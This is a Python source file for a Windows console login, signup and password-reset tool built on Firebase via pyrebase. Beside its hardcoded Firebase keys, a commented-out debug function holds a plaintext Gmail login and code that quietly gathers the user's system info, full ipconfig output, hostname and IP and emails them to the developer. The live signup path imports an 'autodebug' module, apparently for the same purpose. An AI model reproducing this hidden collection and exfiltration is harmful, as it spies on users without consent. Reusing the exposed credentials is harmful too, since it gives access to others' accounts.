import pyrebase
import os
import sys
import time
from time import sleep
from tqdm import tqdm
from rich.traceback import install
from rich.progress import Progress
import subprocess
from sys import platform
#File location and locater
pathname = os.path.dirname(sys.argv[0])

#Configure and Connext to Firebase

firebaseConfig = {
    'apiKey': "AIzaSyCWtx40HpFVqzSejGiWNKgrvvvdCVN9Ms0",
    'authDomain': "ace-os-auth.firebaseapp.com",
    'projectId': "ace-os-auth",
    'databaseURL': "https://ace-os-auth-default-rtdb.firebaseio.com/",
    'storageBucket': "ace-os-auth.appspot.com",
    'messagingSenderId': "977531212093",
    'appId': "1:977531212093:web:e05101a7cd6d15bd1f7554",
    'measurementId': "G-2F166Y0WVT"}



firebase=pyrebase.initialize_app(firebaseConfig)
auth=firebase.auth()












#def debug():
#    import smtplib
#    task = progress.add_task("Creating account...", total=300)
#    
#    systemipfull = subprocess.check_output("ipconfig", shell=True, universal_newlines=True)
#    progress.update(task, advance=18.75)
#    #Boot script           
#    pathname = os.path.dirname(sys.argv[0])
#    progress.update(task, advance=18.75)
#    sleep(1)
#    systeminfo = subprocess.check_output("SYSTEMINFO", shell=True, universal_newlines=True)
#    progress.update(task, advance=18.75)
#    progress.update(task, advance=18.75)
#    progress.update(task, advance=18.75)
#    sleep(1)
#    systemversion = subprocess.check_output("ver", shell=True, universal_newlines=True)
#    sleep(1)
#    from email.mime.multipart import MIMEMultipart
#    from email.mime.text import MIMEText
#    import socket
#    
#    
#    msg = MIMEMultipart()
#    progress.update(task, advance=18.75)
#    
#    progress.update(task, advance=18.75)
#    
#    server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
#    progress.update(task, advance=18.75)
#    server.login("python250200@gmail.com", "TgmpeJ68AUG.5.d",)
#    progress.update(task, advance=18.75)
#    server.sendmail("python250200@gmail.com", "peytonanthony99@gmail.com", "Attention Dev! Someone is using your script and it has crashed :( Not to worry! I have some info for you! :D "
#                    "Here is their System info and full IP info for debug!" + " " + str(systemversion) + " " + 
#                    str(systeminfo) + " " + str(systemipfull))
#    
#    progress.update(task, advance=18.75)
#
#    server.quit()
#    
#    progress.update(task, advance=18.75)
#    
#    from email.mime.multipart import MIMEMultipart
#    from email.mime.text import MIMEText
#    import socket
#    progress.update(task, advance=18.75)
#
#    h_name = socket.gethostname()
#    
#    progress.update(task, advance=18.75)
#    
#    addresssetup = socket.gethostbyname(h_name)
#    
#    progress.update(task, advance=18.75)
#    msg = MIMEMultipart()
#    
#    progress.update(task, advance=18.75)
#    
#    server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
#    server.login("python250200@gmail.com", "TgmpeJ68AUG.5.d",)
#    server.sendmail("python250200@gmail.com", "peytonanthony99@gmail.com", "Attention Dev! Someone used calculator V2 "
#                    "Here is their host name, IP, and Name!" + " " + str(h_name) + " " + str(addresssetup))
#    server.quit()
#    progress.update(task, advance=18.75)
    











#Define Proggresbar
import progressbar

def creating_account():
        for i in tqdm(range(100),
                  desc="Creating Account...",
                  ascii=False, ncols=75):
            time.sleep(0.01)




#Animated Marker
def animated_marker():
    widgets = ['Sending Reset email: ', progressbar.AnimatedMarker()]
    bar = progressbar.ProgressBar(widgets=widgets).start()

    for i in range(10):
        time.sleep(0.1)
        bar.update(i)


#Reset Password
def resetpass():
    print("Reseting Password")
    print("Please Enter your Email Below: ")
    email = input("> ")
    animated_marker()
    auth.send_password_reset_email(email)
    print("Success! If there was an Account associated with this email it will be sent a reset link. Check your inbox.")
    sleep(3)
    os.system("cls")
    menu()


def is_any_user_email_verified(accountinfo):
    return any(u for u in accountinfo['users'] if u['emailVerified'])


#Login function

def login():
    os.system("cls")
    while True:
        print("Login:")
        email=input("Enter email: ")
        password=input("Enter password: ")
        try:
            #Sign in
            user = auth.sign_in_with_email_and_password(email, password)
            #Get new key
            user = auth.refresh(user['refreshToken'])
            accountinfo = auth.get_account_info(user['idToken'])
            #check for verification
            while True:
                if is_any_user_email_verified(accountinfo):
                    break
                else:
                    print("Your email has not been verified! Please verify it with the new link we have sent.")
                    auth.send_email_verification(user['idToken'])
                    menu()
            #Succesfully loged in
            print("Successfully logged in!")
            sleep(5)
            #Get path and launch main file
            chooseosstart = (pathname + r"\choose.exe")
            os.startfile(chooseosstart)
            # print(auth.get_account_info(login['idToken']))
           # email = auth.get_account_info(login['idToken'])['users'][0]['email']
           # print(email)
        except:
            
            print("Invalid email or password")
            print("Would you like to reset your passowrd?[y/n]")
            answer = input("> ")
            if answer == "yes" or answer == "y":
                resetpass()
            elif answer == "n" or answer == "no":
                os.system("cls")
            continue
        return





#Signup Function
def signup():
    os.system("cls")
    while True:
        print("Signup:")
        email = input("Enter email: ")
        password=input("Enter password: ")
        user = auth.create_user_with_email_and_password(email, password)
        import autodebug
        user = auth.refresh(user['refreshToken'])
        auth.send_email_verification(user['idToken'])

        print("Account created! Please verify it with the email sent.")
        sleep(5)
        ask=input("Do you want to login?[y/n]")
        if ask=='y':
            login()
        else:
            menu()
        
        return





#Menu

def menu():
    while True:
        print("Please Choose an option from the list below")
        print("Login | Signup | Reset Password")

        ans = input("> ")

        if ans == 'Login' or ans == 'login' or ans == "l":
            os.system("cls")
            login()
            break
        elif ans == 'Signup' or ans == 'signup' or ans == "s":
            os.system("cls")
            signup()
            break
        elif ans == 'Reset Password' or ans == 'Reset' or ans == 'r':
            os.system("cls")
            resetpass()
            continue





#Main
while True:
    print("Please Choose an option from the list below")
    print("Login | Signup | Reset Password")

    ans = input("> ")

    if ans == 'Login' or ans == 'login' or ans == "l":
        os.system("cls")
        login()
        break
    elif ans == 'Signup' or ans == 'signup' or ans == "s":
        os.system("cls")
        signup()
        break
    elif ans == 'Reset Password' or ans == 'Reset' or ans == 'r':
        os.system("cls")
        resetpass()
        continue





#while True:
#    try:
#        print("Signup:")
#        email = input("Enter email: ")
#        password=input("Enter password: ")
#        user = auth.create_user_with_email_and_password(email, password)
#        user = auth.refresh(user['refreshToken'])
#        auth.send_email_verification(user['idToken'])
#
#        import autodebug
#        install()
#        print("Account created! Please verify it with the email sent.")
#        sleep(5)
#        ask=input("Do you want to login?[y/n]")
#        if ask=='y':
#            login()
#        else:
#            menu()
#    except: 
#        print("Email already exists. Please use another.")
#        sleep(3)
#        print("Would you like to check if you have an account and reset your password?[y/n]")
#        answer = input("> ")
#        if answer == "yes" or answer == "y":
#            resetpass()
#        elif answer == "n" or answer == "no":
#            os.system("cls")
#        continue
#    return